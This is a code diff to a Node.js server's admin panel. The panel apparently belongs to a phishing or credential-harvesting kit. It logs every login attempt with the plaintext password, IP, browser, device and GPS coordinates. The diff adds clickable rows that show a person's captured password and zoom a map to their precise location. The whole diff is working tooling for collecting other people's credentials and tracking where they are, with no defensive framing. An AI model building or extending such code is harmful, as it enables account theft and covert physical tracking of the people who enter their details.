@@ -32,6 +32,7 @@ const server = http.createServer((req, res) => {
         return;
     }
 
+    // Serve frontend
     if (req.url === '/' && req.method === 'GET') {
         const filePath = path.join(__dirname, '../frontend/index.html');
         fs.readFile(filePath, (err, data) => {
@@ -41,6 +42,7 @@ const server = http.createServer((req, res) => {
         return;
     }
 
+    // Login API
     if (req.url === '/api/login' && req.method === 'POST') {
         let body = '';
         req.on('data', chunk => body += chunk);
@@ -94,15 +96,16 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    // Admin panel with zoomable map (markers stay)
+    // Admin panel with clickable users + map
     if (req.url === '/admin') {
         let logsHtml = '';
         for (let log of loginLogs) {
             const loc = log.location ? `${log.location.lat}, ${log.location.lon}` : 'N/A';
+            const hasLocation = log.location ? 'has-location' : '';
             logsHtml += `
-                <tr>
+                <tr class="login-row ${hasLocation}" data-id="${log.id}" data-lat="${log.location?.lat || ''}" data-lon="${log.location?.lon || ''}" data-username="${escapeHtml(log.username)}" data-ip="${log.ip}" data-time="${log.time}" data-browser="${log.browser}" data-os="${log.os}" data-device="${log.device}" data-password="${escapeHtml(log.password)}">
                     <td>${log.id}</td>
-                    <td>${escapeHtml(log.username)}</td>
+                    <td><strong>${escapeHtml(log.username)}</strong></td>
                     <td style="color:#ff6b6b;">${escapeHtml(log.password)}</td>
                     <td>${log.time}</td>
                     <td>${log.ip}</td>
@@ -110,20 +113,32 @@ const server = http.createServer((req, res) => {
                     <td>${log.os || 'Unknown'}</td>
                     <td>${log.device || 'Unknown'}</td>
                     <td>${loc}</td>
+                    <td>${hasLocation ? '📍' : '—'}</td>
                 </tr>
             `;
         }
 
         const locationsWithMarkers = loginLogs
             .filter(l => l.location)
-            .map(l => ({ lat: l.location.lat, lon: l.location.lon, user: l.username }));
+            .map(l => ({ 
+                id: l.id,
+                lat: l.location.lat, 
+                lon: l.location.lon, 
+                user: l.username,
+                time: l.time,
+                ip: l.ip,
+                browser: l.browser,
+                os: l.os,
+                device: l.device,
+                password: l.password
+            }));
 
         res.writeHead(200, { 'Content-Type': 'text/html' });
         res.end(`
             <!DOCTYPE html>
             <html>
             <head>
-                <title>Admin Panel - Login Tracker</title>
+                <title>Admin Panel - Click to Locate</title>
                 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
                 <style>
                     body { background: #0a0e27; color: #00ff88; font-family: monospace; padding: 20px; }
@@ -137,49 +152,127 @@ const server = http.createServer((req, res) => {
                     th { background: #1877f2; color: white; position: sticky; top: 0; }
                     #map { height: 400px; margin: 20px 0; border-radius: 10px; z-index: 1; }
                     .refresh-btn { background: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
+                    .login-row { cursor: pointer; transition: 0.2s; }
+                    .login-row:hover { background: #2a2f4e; }
+                    .login-row.selected { background: #1a3a6e; border-left: 3px solid #00ff88; }
+                    .detail-box { 
+                        background: #1a1f3e; 
+                        padding: 15px; 
+                        border-radius: 10px; 
+                        margin: 15px 0; 
+                        display: none;
+                        border: 1px solid #00ff88;
+                    }
+                    .detail-box h3 { color: #00ff88; margin-bottom: 10px; }
+                    .detail-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+                    .detail-item { background: #0a0e27; padding: 8px 12px; border-radius: 5px; }
+                    .detail-item strong { color: #1877f2; }
                     .leaflet-control-attribution { font-size: 9px; }
                 </style>
             </head>
             <body>
-                <h1>📍 ADMIN PANEL - LOGIN TRACKER</h1>
+                <h1>📍 ADMIN PANEL - CLICK TO LOCATE</h1>
                 <div class="stats">
                     <div class="stat-card"><div class="stat-number">${loginLogs.length}</div><div class="stat-label">Total Logins</div></div>
-                    <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.username === 'admin' && l.password === '123456').length}</div><div class="stat-label">Successful</div></div>
                     <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.location).length}</div><div class="stat-label">With GPS</div></div>
-                    <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.location).length}</div><div class="stat-label">📍 Markers</div></div>
+                    <div class="stat-card"><div class="stat-number">${loginLogs.filter(l => l.username === 'admin' && l.password === '123456').length}</div><div class="stat-label">Successful</div></div>
                 </div>
+
                 <div id="map"></div>
+
+                <div id="detailBox" class="detail-box">
+                    <h3>👤 User Details</h3>
+                    <div class="detail-grid">
+                        <div class="detail-item"><strong>Username:</strong> <span id="detailUser">—</span></div>
+                        <div class="detail-item"><strong>Password:</strong> <span id="detailPass">—</span></div>
+                        <div class="detail-item"><strong>IP:</strong> <span id="detailIP">—</span></div>
+                        <div class="detail-item"><strong>Time:</strong> <span id="detailTime">—</span></div>
+                        <div class="detail-item"><strong>Browser:</strong> <span id="detailBrowser">—</span></div>
+                        <div class="detail-item"><strong>OS:</strong> <span id="detailOS">—</span></div>
+                        <div class="detail-item"><strong>Device:</strong> <span id="detailDevice">—</span></div>
+                        <div class="detail-item"><strong>Location:</strong> <span id="detailLocation">—</span></div>
+                    </div>
+                </div>
+
                 <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
-                <h2>📋 All Login Attempts</h2>
+                <h2>📋 Click any user to see details & map pin</h2>
                 <table>
-                    <thead><tr><th>ID</th><th>Username</th><th>Password</th><th>Time</th><th>IP</th><th>Browser</th><th>OS</th><th>Device</th><th>Location</th></tr></thead>
-                    <tbody>${logsHtml || '<tr><td colspan="9">No logins yet</td></tr>'}</tbody>
+                    <thead><tr><th>ID</th><th>Username</th><th>Password</th><th>Time</th><th>IP</th><th>Browser</th><th>OS</th><th>Device</th><th>Location</th><th>📍</th></tr></thead>
+                    <tbody>${logsHtml || '<tr><td colspan="10">No logins yet</td></tr>'}</tbody>
                 </table>
+
                 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"><\/script>
                 <script>
+                    // Initialize map
                     const map = L.map('map').setView([27.7, 85.3], 7);
                     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                        attribution: '&copy; OpenStreetMap contributors'
+                        attribution: '&copy; OpenStreetMap'
                     }).addTo(map);
 
-                    const locations = ${JSON.stringify(locationsWithMarkers)};
-                    console.log('📍 Markers:', locations);
+                    // Store markers
+                    let markers = {};
+                    const locationData = ${JSON.stringify(locationsWithMarkers)};
 
-                    // Add markers (they stay when zooming)
-                    locations.forEach(loc => {
+                    // Add markers
+                    locationData.forEach(loc => {
                         if (loc.lat && loc.lon) {
-                            L.marker([loc.lat, loc.lon], { riseOnHover: true })
+                            const marker = L.marker([loc.lat, loc.lon], { riseOnHover: true })
                                 .addTo(map)
-                                .bindPopup('<strong>📍 ' + loc.user + '</strong>');
+                                .bindPopup('<strong>' + loc.user + '</strong><br>' + loc.time);
+                            markers[loc.id] = { marker, lat: loc.lat, lon: loc.lon, data: loc };
                         }
                     });
 
-                    // Fit map to show all markers if any exist
-                    if (locations.length > 0) {
+                    // Auto-fit map to markers
+                    if (locationData.length > 0) {
                         const group = L.featureGroup(
-                            locations.map(loc => L.marker([loc.lat, loc.lon]))
+                            locationData.map(loc => L.marker([loc.lat, loc.lon]))
                         );
                         map.fitBounds(group.getBounds().pad(0.2));
+                    }
+
+                    // Click handler for table rows
+                    document.querySelectorAll('.login-row').forEach(row => {
+                        row.addEventListener('click', function() {
+                            // Remove previous selection
+                            document.querySelectorAll('.login-row').forEach(r => r.classList.remove('selected'));
+
+                            // Add selection to clicked row
+                            this.classList.add('selected');
+
+                            const id = this.dataset.id;
+                            const lat = this.dataset.lat;
+                            const lon = this.dataset.lon;
+                            const username = this.dataset.username;
+                            const password = this.dataset.password;
+                            const ip = this.dataset.ip;
+                            const time = this.dataset.time;
+                            const browser = this.dataset.browser;
+                            const os = this.dataset.os;
+                            const device = this.dataset.device;
+
+                            // Show details
+                            document.getElementById('detailBox').style.display = 'block';
+                            document.getElementById('detailUser').innerText = username || '—';
+                            document.getElementById('detailPass').innerText = password || '—';
+                            document.getElementById('detailIP').innerText = ip || '—';
+                            document.getElementById('detailTime').innerText = time || '—';
+                            document.getElementById('detailBrowser').innerText = browser || '—';
+                            document.getElementById('detailOS').innerText = os || '—';
+                            document.getElementById('detailDevice').innerText = device || '—';
+                            document.getElementById('detailLocation').innerText = (lat && lon) ? lat + ', ' + lon : 'No GPS';
+
+                            // Zoom to marker if exists
+                            if (lat && lon) {
+                                map.setView([parseFloat(lat), parseFloat(lon)], 15);
+                            }
+                        });
+                    });
+
+                    // Auto-select first row with location
+                    const firstWithLocation = document.querySelector('.login-row.has-location');
+                    if (firstWithLocation) {
+                        firstWithLocation.click();
                     }
                 <\/script>
             </body>
